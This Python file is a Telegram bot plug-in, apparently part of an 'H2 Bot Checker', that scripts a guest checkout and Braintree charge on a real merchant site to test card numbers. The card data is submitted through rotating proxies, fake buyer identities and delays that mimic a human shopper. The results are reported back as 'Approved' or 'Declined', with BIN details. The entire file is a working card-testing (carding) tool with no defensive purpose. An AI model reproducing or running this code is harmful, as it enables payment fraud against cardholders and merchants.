from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
import json
import random
from time import perf_counter
import httpx
import string
from faker import Faker
from urllib.parse import quote
import base64
import asyncio
from typing import Dict, List, Union, Optional
import requests # Importar requests para la info del BIN
from pyrogram.errors import MessageNotModified # Importar la excepción

# Función para formatear proxies (la mantendremos igual)
def format_proxies(proxy_list, reverse=True):
    cleaned_proxies = [proxy.strip() for proxy in proxy_list.replace('[', '').replace(']', '').split(',')]
    sorted_proxies = sorted(cleaned_proxies, reverse=reverse)
    emojis = ['🌐', '✅', '☄️', '🌦']
    formatted_proxies = []
    for proxy in sorted_proxies:
        ip, port = proxy.strip().split(':')
        encrypted_ip = '.'.join([num[0] + '*' for num in ip.split('.')])
        emoji = random.choice(emojis)
        formatted_proxy = f"{encrypted_ip}:{port} {emoji}"
        formatted_proxies.append(formatted_proxy)
    
    return formatted_proxies

# Lista de proxies (la mantendremos igual)
proxy_list = """
216.65.157.195:14885,
216.65.154.243:14423,
216.65.150.165:14600,
216.65.157.126:14816,
216.65.150.72:14507,
216.65.149.101:10456,
216.65.157.166:14856,
216.65.157.119:14809,
216.65.154.142:14322,
216.65.150.124:14559,
216.65.154.168:14348,
216.65.150.168:14603,
216.65.150.157:14592,
216.65.154.146:14326,
216.65.157.176:14866,
216.65.157.121:14811,
216.65.150.52:14487,
216.65.157.177:14867,
216.65.159.23:14968,
216.65.154.129:14309,
216.65.159.238:15183,
216.65.157.188:14878,
216.65.157.220:14910,
216.65.157.155:14845,
216.65.151.23:10888
"""

cmd = "b3"
pasarela = "Braintree Auth"

async def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    faker = Faker()
    return {
        'name': faker.name(),
        'email': faker.email().replace('@', f'{number}@'),
        'username': faker.user_name(),
        'phone': f'512678{number}',
        'city': faker.city(),
        'code': postal
    }

def capture(data: str, start: str, end: str) -> Optional[str]:
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

# Función para generar la barra de carga
def create_loading_bar(percentage):
    bar_length = 10
    filled_length = int(bar_length * percentage / 100)
    # Usamos diferentes caracteres para simular cambio de "color"
    if percentage < 30:
        bar = '▓' * filled_length + '░' * (bar_length - filled_length)
    elif percentage < 70:
         bar = '▒' * filled_length + '░' * (bar_length - filled_length)
    else:
         bar = '█' * filled_length + '░' * (bar_length - filled_length)
    return f"[{bar}] {percentage}%"

async def brn(client, message, cc: str, mes: str, ano: str, cvv: str, proxy: str) -> Union[List, Dict]:
    try:
        # Imprimir inicio del proceso en terminal
        print(f"[{perf_counter():.2f}s] [B3Auth] Iniciando verificación para {cc}|{mes}|{ano}|{cvv}")

        # Validar formato de tarjeta antes de procesar
        if not cc or len(cc) < 13 or len(cc) > 19 or not cc.isdigit():
            return "Declined ❌", "Número de tarjeta inválido (formato incorrecto)"
        
        if not mes or len(mes) != 2 or not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
            return "Declined ❌", "Mes inválido"
        
        if not ano or (len(ano) != 2 and len(ano) != 4) or not ano.isdigit():
            return "Declined ❌", "Año inválido"
        
        if not cvv or len(cvv) < 3 or len(cvv) > 4 or not cvv.isdigit():
            return "Declined ❌", "CVV inválido"

        # Configurar el proxy
        proxy_dict = None
        if proxy and '*' not in proxy:
            try:
                host, port = proxy.split(':')
                proxy_dict = {
                    "http://": f"http://{host}:{port}",
                    "https://": f"http://{host}:{port}"
                }
            except:
                print(f"[{perf_counter():.2f}s] [B3Auth] Error al formatear proxy: {proxy}")

        async with httpx.AsyncClient(
            verify=False, 
            follow_redirects=True,
            proxies=proxy_dict,
            timeout=30.0
        ) as client:
            if len(ano) == 2:
                ano = "20" + ano
            
            # User data generation
            user_data = await usuario()
            name = user_data['name'].split(' ')[0]
            last = user_data['name'].split(' ')[1]
            email = name + last + ("".join(random.choices(string.digits, k=3))) + "@gmail.com"
            number = random.randint(1111, 9999)
            street = f"{name}+street+{number}"
            phone = user_data['phone']
            useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            base_headers = {
                "User-Agent": useragent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "DNT": "1",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "max-age=0"
            }

            # Paso 1: Acceder a la página del producto (10%)
            print(f"[{perf_counter():.2f}s] [B3Auth] Paso 1: Accediendo al producto... 🌐")
            await asyncio.sleep(1)  # Delay para simular comportamiento humano

            # Paso 2: Añadir producto al carrito (20%)
            print(f"[{perf_counter():.2f}s] [B3Auth] Paso 2: Añadiendo al carrito... 🛒")
            headers = {
                **base_headers,
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Referer": "https://www.rainvac.com/rainbow-vacuum-parts/srx/cap-assembly/wedge-ui-srx",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.rainvac.com"
            }
            try:
                response = await client.post(
                    "https://www.rainvac.com/index.php?route=checkout/cart/add",
                    data="product_id=2883&quantity=1",
                    headers=headers
                )
                if response.status_code != 200:
                    return "Error ❌", f"Error al agregar al carrito: {response.status_code}"
            except Exception as e:
                return "Error ❌", f"Error de conexión: {str(e)}"
            
            await asyncio.sleep(1)  # Delay para simular comportamiento humano

            # Paso 3: Validar datos del invitado (30%)
            print(f"[{perf_counter():.2f}s] [B3Auth] Paso 3: Validando datos... 👤")
            guest_data = f"emailx=&firstname={name}&lastname={last}&company_id=&tax_id=&email={quote(email)}&country_id2=223&=&=312&=123&=1234&=&=&=&=&postcode2=10080&address_12={street}&address_13=&company=&address_1={street}&address_2=&city=ny&postcode=10080&country_id=223&zone_id=3655&address_telephone={phone}&address_telephone_1=312&address_telephone_2=123&address_telephone_3=1234&fax=&=&=&=&shipping_address=1"
            try:
                response = await client.post(
                    "https://www.rainvac.com/index.php?route=checkout/guest/validate",
                    data=guest_data,
                    headers=headers
                )
                if response.status_code != 200:
                    return "Error ❌", f"Error en validación de invitado: {response.status_code}"
            except Exception as e:
                return "Error ❌", f"Error de conexión: {str(e)}"
            
            await asyncio.sleep(1)  # Delay para simular comportamiento humano

            # Generar timestamps únicos para evitar caché
            import time
            timestamp1 = int(time.time() * 1000)
            timestamp2 = int(time.time() * 1000) + 1
            
            # Paso 4: Obtener método de envío (40%)
            print(f"[{perf_counter():.2f}s] [B3Auth] Paso 4: Obteniendo envío... 📦")
            try:
                response = await client.get(
                    f"https://www.rainvac.com/index.php?route=checkout/shipping_method&_={timestamp1}",
                    headers={**base_headers, "X-Requested-With": "XMLHttpRequest"}
                )
                if response.status_code != 200:
                    return "Error ❌", f"Error en método de envío: {response.status_code}"
            except Exception as e:
                return "Error ❌", f"Error de conexión: {str(e)}"
            
            await asyncio.sleep(1)  # Delay para simular comportamiento humano

            # Paso 5: Validar método de envío (50%)
            print(f"[{perf_counter():.2f}s] [B3Auth] Paso 5: Validando envío... ✅")
            try:
                response = await client.post(
                    "https://www.rainvac.com/index.php?route=checkout/shipping_method/validate",
                    data="shipping_method=ocatbs.ocatbs_6&comment=&rush=0",
                    headers=headers
                )
                if response.status_code != 200:
                    return "Error ❌", f"Error en validación de envío: {response.status_code}"
            except Exception as e:
                return "Error ❌", f"Error de conexión: {str(e)}"
            
            await asyncio.sleep(1)  # Delay para simular comportamiento humano

            # Paso 6: Obtener método de pago (60%)
            print(f"[{perf_counter():.2f}s] [B3Auth] Paso 6: Obteniendo pago... 💳")
            try:
                pay_mm = await client.get(
                    f"https://www.rainvac.com/index.php?route=checkout/payment_method&_={timestamp2}",
                    headers={**base_headers, "X-Requested-With": "XMLHttpRequest"}
                )
                if pay_mm.status_code != 200:
                    return "Error ❌", f"Error en método de pago: {pay_mm.status_code}"
            except Exception as e:
                return "Error ❌", f"Error de conexión: {str(e)}"
            
            await asyncio.sleep(1)  # Delay para simular comportamiento humano

            # Paso 7: Validar método de pago (70%)
            print(f"[{perf_counter():.2f}s] [B3Auth] Paso 7: Validando pago... ✅")
            try:
                response = await client.post(
                    "https://www.rainvac.com/index.php?route=checkout/payment_method/validate",
                    data="payment_method=braintree&comment=",
                    headers=headers
                )
                if response.status_code != 200:
                    return "Error ❌", f"Error en validación de pago: {response.status_code}"
            except Exception as e:
                return "Error ❌", f"Error de conexión: {str(e)}"
            
            await asyncio.sleep(1)  # Delay para simular comportamiento humano

            # Paso 8: Obtener confirmación de checkout (80%)
            print(f"[{perf_counter():.2f}s] [B3Auth] Paso 8: Confirmando checkout... 🧾")
            
            # Generar timestamp único para evitar caché
            timestamp = int(time.time() * 1000)
            
            # Intentar múltiples URLs para obtener el token
            token = None
            urls_to_try = [
                f"https://www.rainvac.com/index.php?route=checkout/confirm&_={timestamp}",
                "https://www.rainvac.com/checkout/checkout",
                f"https://www.rainvac.com/index.php?route=checkout/checkout&_={timestamp}"
            ]
            
            response = None
            for url in urls_to_try:
                try:
                    print(f"[{perf_counter():.2f}s] [B3Auth] Intentando URL: {url}")
                    response = await client.get(
                        url,
                        headers={
                            **base_headers,
                            "X-Requested-With": "XMLHttpRequest",
                            "Referer": "https://www.rainvac.com/",
                            "Sec-Fetch-Site": "same-origin"
                        }
                    )
                    if response and response.status_code == 200 and len(response.text) > 100:
                        print(f"[{perf_counter():.2f}s] [B3Auth] URL exitosa: {url}")
                        break
                except Exception as e:
                    print(f"[{perf_counter():.2f}s] [B3Auth] Error con URL {url}: {str(e)}")
                    continue
            
            if response is None or response.status_code != 200 or len(response.text) < 100:
                status_code = response.status_code if response else "N/A"
                response_length = len(response.text) if response else 0
                return "Error ❌", f"Error en confirmación: {status_code} - Respuesta muy corta ({response_length} chars)"

            # Intentar múltiples patrones para capturar el token
            response_text = response.text
            token = None
            
            print(f"[{perf_counter():.2f}s] [B3Auth] Longitud de respuesta: {len(response_text)} caracteres")
            
            # Intentar parsear como JSON primero
            try:
                import json
                json_data = json.loads(response_text)
                if isinstance(json_data, dict):
                    # Buscar en diferentes campos JSON
                    for key in ['clientToken', 'authorization', 'authorizationFingerprint', 'token', 'data']:
                        if key in json_data:
                            value = json_data[key]
                            if isinstance(value, str) and len(value) > 20:
                                token = value
                                print(f"[{perf_counter():.2f}s] [B3Auth] Token encontrado en JSON campo '{key}'")
                                break
                        elif isinstance(json_data.get('data'), dict) and key in json_data['data']:
                            value = json_data['data'][key]
                            if isinstance(value, str) and len(value) > 20:
                                token = value
                                print(f"[{perf_counter():.2f}s] [B3Auth] Token encontrado en JSON data.{key}")
                                break
            except:
                pass
            
            # Patrón 1: braintree.dropin.create con diferentes variantes
            if token is None:
                patterns = [
                    ("braintree.dropin.create({authorization:'", "'"),
                    ("braintree.dropin.create({authorization:\"", "\""),
                    ("braintree.dropin.create({authorization:", "}"),
                    ("braintree.dropin.create({authorization:", ","),
                ]
                for start, end in patterns:
                    token = capture(response_text, start, end)
                    if token:
                        print(f"[{perf_counter():.2f}s] [B3Auth] Token encontrado con patrón: {start[:30]}...")
                        break
            
            # Patrón 2: authorizationFingerprint en diferentes formatos
            if token is None:
                patterns = [
                    ('"authorizationFingerprint":"', '"'),
                    ("'authorizationFingerprint':'", "'"),
                    ('authorizationFingerprint":"', '"'),
                    ('authorizationFingerprint:', '"'),
                ]
                for start, end in patterns:
                    token = capture(response_text, start, end)
                    if token:
                        print(f"[{perf_counter():.2f}s] [B3Auth] Token encontrado con authorizationFingerprint")
                        break
            
            # Patrón 3: clientToken
            if token is None:
                patterns = [
                    ('"clientToken":"', '"'),
                    ("'clientToken':'", "'"),
                    ('clientToken":"', '"'),
                ]
                for start, end in patterns:
                    token = capture(response_text, start, end)
                    if token:
                        print(f"[{perf_counter():.2f}s] [B3Auth] Token encontrado con clientToken")
                        break
            
            # Patrón 4: authorization
            if token is None:
                patterns = [
                    ('"authorization":"', '"'),
                    ("'authorization':'", "'"),
                    ('authorization":"', '"'),
                ]
                for start, end in patterns:
                    token = capture(response_text, start, end)
                    if token:
                        print(f"[{perf_counter():.2f}s] [B3Auth] Token encontrado con authorization")
                        break
            
            # Patrón 5: Buscar en el JavaScript con regex más flexibles
            if token is None:
                import re
                js_patterns = [
                    r'authorization["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                    r'clientToken["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                    r'authorizationFingerprint["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                    r'braintree["\']?\s*\.\s*dropin["\']?\s*\.\s*create["\']?\s*\([^)]*authorization["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
                    r'["\']authorization["\']?\s*:\s*["\']([A-Za-z0-9+/=]{20,})["\']',
                ]
                for pattern in js_patterns:
                    match = re.search(pattern, response_text, re.IGNORECASE | re.DOTALL)
                    if match:
                        token = match.group(1)
                        print(f"[{perf_counter():.2f}s] [B3Auth] Token encontrado con patrón regex: {pattern[:50]}...")
                        break
            
            # Patrón 6: Buscar cualquier string base64 largo que pueda ser un token
            if token is None:
                import re
                # Buscar strings base64 largos
                token_pattern = r'[A-Za-z0-9+/]{30,}={0,2}'
                matches = re.findall(token_pattern, response_text)
                for match in matches:
                    if len(match) > 30:  # Los tokens suelen ser largos
                        try:
                            # Intentar decodificar para ver si es válido
                            test_decode = base64.b64decode(match + "==")
                            decoded_str = str(test_decode)
                            if 'authorizationFingerprint' in decoded_str or 'clientToken' in decoded_str:
                                token = match
                                print(f"[{perf_counter():.2f}s] [B3Auth] Token encontrado con búsqueda general base64")
                                break
                        except:
                            continue
            
            if token is None:
                print(f"[{perf_counter():.2f}s] [B3Auth] Error: No se pudo obtener el token inicial.")
                print(f"[{perf_counter():.2f}s] [B3Auth] Tipo de respuesta: {type(response_text)}")
                print(f"[{perf_counter():.2f}s] [B3Auth] Longitud: {len(response_text)}")
                print(f"[{perf_counter():.2f}s] [B3Auth] Primeros 2000 chars: {response_text[:2000]}")
                print(f"[{perf_counter():.2f}s] [B3Auth] Últimos 500 chars: {response_text[-500:]}")
                return "Error ❌", "No se pudo obtener el token inicial"

            # Intentar decodificar el token si está en base64
            bearer_b3 = None
            try:
                decode = base64.b64decode(token)
                bearer_b3 = capture(str(decode), '"authorizationFingerprint":"', '"')
            except:
                # Si no es base64, usar el token directamente
                bearer_b3 = token

            if bearer_b3 is None:
                print(f"[{perf_counter():.2f}s] [B3Auth] Error: No se pudo obtener el bearer token.")
                return "Error ❌", "No se pudo obtener el bearer token"

            # Paso 9: Tokenizar la tarjeta con Braintree (90%)
            print(f"[{perf_counter():.2f}s] [B3Auth] Paso 9: Tokenizando tarjeta... 🔒")
            headers = {
                **base_headers,
                "Content-Type": "application/json",
                "Authorization": f"Bearer {bearer_b3}",
                "Braintree-Version": "2018-05-10",
                "Origin": "https://assets.braintreegateway.com",
                "Referer": "https://assets.braintreegateway.com/"
            }

            card_data = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "dropin2",
                    "sessionId": "f850a913-64c3-42d2-9ad2-ade0d1fbf2e0"
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mes,
                            "expirationYear": ano,
                            "cvv": cvv
                        },
                        "options": {"validate": False}
                    }
                },
                "operationName": "TokenizeCreditCard"
            }

            try:
                response = await client.post(
                    "https://payments.braintree-api.com/graphql",
                    json=card_data,
                    headers=headers
                )
                if response.status_code != 200:
                    return "Error ❌", f"Error en tokenización: {response.status_code}"
            except Exception as e:
                return "Error ❌", f"Error de conexión: {str(e)}"
            
            token = capture(response.text, '"token":"', '"')
            if token is None:
                print(f"[{perf_counter():.2f}s] [B3Auth] Error: No se pudo obtener el token de la tarjeta.")
                return "Error ❌", "No se pudo obtener el token de la tarjeta"

            # Paso 10: Enviar el nonce para el cargo final (100%)
            print(f"[{perf_counter():.2f}s] [B3Auth] Paso 10: Enviando para cargo final... ⚡")
            headers = {
                **base_headers,
                "Referer": "https://www.rainvac.com/checkout/checkout",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.rainvac.com"
            }
            
            final_data = f"nonce={token}&device_data=%7B%22device_session_id%22%3A%22ca3f26645e87ea4949f51809e8ce1084%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%220adcb396da9686cb0221335e2471cc24%22%7D"
            try:
                response = await client.post(
                    "https://www.rainvac.com/index.php?route=payment/braintree/chargeNonce",
                    data=final_data,
                    headers=headers
                )
                if response.status_code != 200:
                    return "Error ❌", f"Error en cargo final: {response.status_code}"
            except Exception as e:
                return "Error ❌", f"Error de conexión: {str(e)}"

            r6 = response.text
            print(f"[{perf_counter():.2f}s] [B3Auth] Respuesta cruda final recibida (primeros 200 chars): {r6[:200]}")
            print(f"[{perf_counter():.2f}s] [B3Auth] Respuesta completa: {r6}")

            # Validación más precisa de la respuesta - ORDEN IMPORTANTE: más específico primero
            r6_lower = r6.lower() if r6 else ""
            
            # Primero verificar respuestas de éxito reales
            if 'Charged' in r6 and 'Success' in r6 and 'error' not in r6_lower and 'declined' not in r6_lower:
                msg = "Approved CCN ✅"
                respuesta = "Cargo Completado - 7$"
            # Luego verificar todos los tipos de rechazo
            elif 'Transaction Declined' in r6 or 'transaction declined' in r6_lower:
                msg = "Declined ❌"
                respuesta = "Your card was declined."
            elif 'Card Issuer Declined' in r6 or 'card issuer declined' in r6_lower:
                msg = "Declined ❌"
                respuesta = "Tarjeta rechazada por el emisor."
            elif "Card Issuer Declined CVV" in r6 or "card issuer declined cvv" in r6_lower:
                msg = "Declined ❌"
                respuesta = "CVV Incorrecto - Tarjeta rechazada"
            elif 'Insufficient Funds' in r6 or 'insufficient funds' in r6_lower:
                msg = "Declined ❌"
                respuesta = "Fondos insuficientes."
            elif 'Processor Declined' in r6 or 'processor declined' in r6_lower:
                msg = "Declined ❌"
                respuesta = "Rechazada por el procesador."
            elif 'Gateway Rejected' in r6 or 'gateway rejected' in r6_lower:
                msg = "Declined ❌"
                respuesta = "Rechazada por el gateway."
            elif 'avs_and_cvv' in r6_lower or 'avs and cvv' in r6_lower:
                msg = "Declined ❌"
                respuesta = "Error en AVS/CVV - Tarjeta rechazada"
            elif 'invalid card number' in r6_lower or 'invalid number' in r6_lower:
                msg = "Declined ❌"
                respuesta = "Número de tarjeta inválido."
            elif 'expired' in r6_lower or 'expiration date' in r6_lower:
                msg = "Declined ❌"
                respuesta = "Tarjeta expirada."
            elif 'cvv' in r6_lower and ('incorrect' in r6_lower or 'mismatch' in r6_lower or 'invalid' in r6_lower):
                msg = "Declined ❌"
                respuesta = "Código de seguridad incorrecto."
            elif 'lost card' in r6_lower or 'stolen card' in r6_lower:
                msg = "Declined ❌"
                respuesta = "Tarjeta reportada como robada o perdida."
            elif 'limit exceeded' in r6_lower or 'exceeds limit' in r6_lower:
                msg = "Declined ❌"
                respuesta = "Límite de tarjeta excedido."
            elif 'not permitted' in r6_lower or 'not allowed' in r6_lower:
                msg = "Declined ❌"
                respuesta = "Transacción no permitida."
            elif 'network error' in r6_lower or ('network' in r6_lower and 'error' in r6_lower):
                msg = "Declined ❌"
                respuesta = "Error de red, intente de nuevo."
            elif 'try again later' in r6_lower or 'temporarily unavailable' in r6_lower:
                msg = "Declined ❌"
                respuesta = "Intente de nuevo más tarde."
            # Solo aprobar si hay indicadores claros de éxito Y no hay indicadores de error
            elif ('approved' in r6_lower or 'success' in r6_lower) and 'declined' not in r6_lower and 'error' not in r6_lower and 'rejected' not in r6_lower:
                msg = "Approved CCN ✅"
                respuesta = "Transacción aprobada."
            # Si la respuesta está vacía o es muy corta, es un error
            elif not r6 or len(r6.strip()) < 10:
                msg = "Declined ❌"
                respuesta = "Respuesta vacía del servidor."
            else:
                msg = "Declined ❌"
                respuesta = f"Respuesta desconocida: {r6[:100]}"

            print(f"[{perf_counter():.2f}s] [B3Auth] Proceso finalizado. Estado: {msg}, Respuesta: {respuesta}")
            return msg, respuesta

    except Exception as e:
        # Manejo de errores generales en la función brn
        print(f"[{perf_counter():.2f}s] [B3Auth] Excepción en la gate: {str(e)}")
        # Si ocurre un error en medio del proceso, editar el mensaje para mostrarlo
        await message.edit_text(f"""<b>あ » H2 Bot Checker | Error</b>\n\n【𝙀𝙧𝙧𝙤𝙧】: Excepción en la gate\n【𝙈𝙚𝙣𝙨𝙖𝙟𝙚】: {str(e)}\n—————— <b>あ » H2 Bot Checker</b> ——————</b>""")
        return "Error ❌", f"Excepción en la gate: {str(e)}"

@Client.on_message(filters.command("b3", prefixes=["/",".","$","!","%","#"]) & filters.text)
async def b3_auth(client: Client, m: Message):
    processing_message = None # Inicializar a None por si falla antes de enviar el mensaje
    try:
        # Verificar si el gateway está activo
        try:
            with open("utils/json/gates.json", "r") as file:
                gates = json.load(file)
                if not gates.get("b3", True):
                    return await m.reply(f"""<b>あ » H2 Bot Checker | Error</b>\n\n【𝙂𝙖t𝙚𝙬𝙖𝙮】: En mantenimiento ⚠️\n【𝙏𝙮𝙥𝙚】: {pasarela}\n—————— <b>あ » H2 Bot Checker</b> ——————</b>""", quote=True)
        except FileNotFoundError:
             return await m.reply("<b>Error: El archivo de configuración de gateways (utils/json/gates.json) no se encuentra. Por favor, contacta a un administrador.</b>", quote=True)
        except json.JSONDecodeError:
             return await m.reply("<b>Error: El archivo de configuración de gateways (utils/json/gates.json) no es válido. Por favor, contacta a un administrador.</b>", quote=True)

        # Obtener el texto del mensaje y validar formato
        text = m.text.split()
        if len(text) < 2 or '|' not in text[1]:
            return await m.reply(f"""<b>あ » H2 Bot Checker | {pasarela}</b>\n\n【𝙐𝙨𝙖𝙜𝙚】: <code>${cmd} cc|mm|yy|cvv</code>\n【𝙀𝙭𝙖𝙢𝙥𝙡𝙚】: <code>${cmd} 4532015112830366|12|25|258</code>\n—————— <b>あ » H2 Bot Checker</b> ——————</b>""", quote=True)

        # Extraer información de la tarjeta
        cc_info = text[1].split('|')
        if len(cc_info) != 4:
            return await m.reply(f"""<b>あ » H2 Bot Checker | Error</b>\n\n【𝙀𝙧𝙧𝙤𝙧】: Formato inválido\n【𝙐𝙨𝙖𝙜𝙚】: <code>${cmd} cc|mm|yy|cvv</code>\n—————— <b>あ » H2 Bot Checker</b> ——————</b>""", quote=True)

        cc, mes, ano, cvv = cc_info

        # Validar que sean dígitos
        if not (cc.isdigit() and mes.isdigit() and ano.isdigit() and cvv.isdigit()):
             return await m.reply("<b>Error: La tarjeta, mes, año o cvv contienen caracteres no numéricos.</b>", quote=True)

        # Enviamos el mensaje inicial y obtenemos el objeto message para editar
        processing_message = await m.reply(
            f"[荣] Card ┊  {cc}|{mes}|{ano}|{cvv}\n"
            f"[荣] Status ↝ Testing...\n"
            f"[荣] Response ↝ ...\n"
            f"[荣] Gateway ↝ Braintree Auth\n"
            f"- - - - - - - - - - - - - - - - - - - - - - - -\n"
            f"[荣] Bank ↝ ...\n"
            f"[荣] Type ↝ ...\n"
            f"[荣] Country ↝ ...\n"
            f"- - - - - - - - - - - - - - - - - - - - - - - -\n"
            f"[荣] Time ↝ 0.0's \n"
            f"[荣] Proxys Live ✅\n"
            f"[荣] Checked ↝ @{m.from_user.username or 'Sin username'}"
        , quote=True)

        # Animación de testeo igual que en sh.py
        start_anim = perf_counter()
        for percent in [20, 40, 60, 80, 100]:
            await asyncio.sleep(0.3)
            await processing_message.edit_text(
                f"[荣] Card ┊  {cc}|{mes}|{ano}|{cvv}\n"
                f"[荣] Status ↝ Testing...\n"
                f"[荣] Response ↝ ...\n"
                f"[荣] Gateway ↝ Braintree Auth\n"
                f"- - - - - - - - - - - - - - - - - - - - - - - -\n"
                f"[荣] Bank ↝ ...\n"
                f"[荣] Type ↝ ...\n"
                f"[荣] Country ↝ ...\n"
                f"- - - - - - - - - - - - - - - - - - - - - - - -\n"
                f"[荣] Time ↝ {perf_counter() - start_anim:.2f}'s \n"
                f"[荣] Proxys Live ✅\n"
                f"[荣] Checked ↝ @{m.from_user.username or 'Sin username'}"
            )

        # Obtener información del BIN
        try:
            bin_info_req = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
            bin_data = bin_info_req.json()
            if bin_info_req.status_code != 200 or 'country_name' not in bin_data:
                 bin_info_text = "Info BIN: No disponible"
            else:
                country_name = bin_data.get('country_name', 'N/A')
                country_flag = bin_data.get('country_flag', '🌎')
                bank = bin_data.get('bank', 'N/A')
                brand = bin_data.get('brand', 'N/A')
                level = bin_data.get('level', 'N/A')
                typea = bin_data.get('type', 'N/A')
                bin_info_text = f"""【𝙄𝙣𝙛𝙤 𝘽𝙄𝙉】: <code>{cc[:6]}</code> - {country_name} {country_flag}
【𝘽𝙖𝙣𝙠】: {bank}
【𝙏𝙮𝙥𝙚】: {brand} - {level} - {typea}"""

        except Exception as bin_e:
            print(f"Error al obtener info del BIN: {str(bin_e)}")
            bin_info_text = "Info BIN: Error al obtener datos"

        # Obtener proxy aleatorio
        formatted_list = format_proxies(proxy_list)
        if not formatted_list:
            proxy = "No disponible"
            print("Advertencia: La lista de proxies está vacía.")
        else:
             proxy = random.choice(formatted_list)

        # Iniciar temporizador
        start_time = perf_counter()

        # Procesar la tarjeta usando la función brn
        # Pasamos client y processing_message a brn, para que edite el mensaje de progreso
        msg, respuesta = await brn(client, processing_message, cc, mes, ano, cvv, proxy) # PASAMOS client y processing_message

        # Calcular tiempo de respuesta
        end_time = perf_counter()
        tiempo = end_time - start_time

        # Mensaje final (usamos processing_message para editar el mensaje que ya existe)
        pais_flag = ''
        if 'country_flag' in locals() and 'country_name' in locals():
            pais_flag = f"{country_name} {country_flag}" if country_name != 'N/A' and country_flag else country_name
        else:
            # Intentar extraer país y bandera del bin_info_text si está disponible
            try:
                pais_flag = bin_info_text.split('\n')[0].split('-')[1].strip()
            except:
                pais_flag = 'N/A'

        # Extraer banco, tipo y marca del bin_info_text si es posible
        bank = brand = level = typea = 'N/A'
        try:
            for line in bin_info_text.split('\n'):
                if '【𝘽𝙖𝙣𝙠】' in line:
                    bank = line.split(':',1)[1].strip()
                if '【𝙏𝙮𝙥𝙚】' in line:
                    type_line = line.split(':',1)[1].strip()
                    parts = type_line.split('-')
                    if len(parts) >= 3:
                        brand = parts[0].strip()
                        level = parts[1].strip()
                        typea = parts[2].strip()
        except:
            pass

        # Escapar caracteres especiales para MarkdownV2
        def esc(text):
            return str(text).replace('-', '\-').replace('.', '\.').replace('(', '\(').replace(')', '\)').replace('!', '\!').replace('=', '\=').replace('~', '\~').replace('|', '\|').replace('`', '\`').replace('>', '\>').replace('#', '\#').replace('+', '\+').replace('_', '\_').replace('[', '\[').replace(']', '\]').replace('{', '\{').replace('}', '\}').replace('$', '\$')

        respuesta_final = (
            f"[荣] H2 Checker ┊ Braintree Auth\n"
            f"[荣] Card ┊  {cc}|{mes}|{ano}|{cvv}\n"
            f"[荣] Status ↝ {msg}\n"
            f"[荣] Response ↝ {respuesta}\n"
            f"[荣] Gateway ↝ Braintree Auth\n"
            f"- - - - - - - - - - - - - - - - - - - - - - - -\n"
            f"[荣] Bank ↝ {bank}\n"
            f"[荣] Type ↝ {brand} - {level} - {typea}\n"
            f"[荣] Country ↝ {pais_flag}\n"
            f"- - - - - - - - - - - - - - - - - - - - - - - -\n"
            f"[荣] Time ↝ {tiempo:.2f}'s \n"
            f"[荣] Proxys Live ✅\n"
            f"[荣] Checked ↝ @{m.from_user.username or 'Sin username'}"
        )
        await processing_message.edit_text(respuesta_final)

    except MessageNotModified:
        # Si el mensaje no fue modificado (ya tiene el mismo contenido), simplemente ignoramos el error
        print(f"[{perf_counter():.2f}s] [B3Auth] Intento de editar mensaje con contenido idéntico. Ignorado.")
        pass # No hacemos nada, el mensaje ya es el correcto o un error anterior ya lo mostró
    except Exception as e:
        print(f"[{perf_counter():.2f}s] [B3Auth] Error general en b3_auth: {str(e)}")
        # Si hubo un error antes de enviar el primer mensaje o al editar, enviar un nuevo mensaje
        error_message_text = f"""<b>あ » H2 Bot Checker | Error</b>\n\n【𝙀𝙧𝙧𝙤𝙧】: {str(e)}\n【𝙈𝙚𝙣𝙨𝙖𝙟𝙚】: Ocurrió un error general al procesar la tarjeta\n—————— <b>あ » H2 Bot Checker</b> ——————</b>"""
        if processing_message:
            try:
                # Intentar editar el mensaje de procesamiento con el error general si existe
                await processing_message.edit_text(error_message_text)
            except MessageNotModified:
                # Si falla la edición porque el contenido es el mismo, no hacemos nada
                print(f"[{perf_counter():.2f}s] [B3Auth] Intento de editar mensaje de error con contenido idéntico. Ignorado.")
                pass
            except Exception:
                # Si falla la edición por otra razón, enviamos un nuevo mensaje
                 await m.reply(error_message_text, quote=True)
        else:
            # Si processing_message nunca se llegó a crear, enviar un nuevo mensaje
            await m.reply(error_message_text, quote=True) 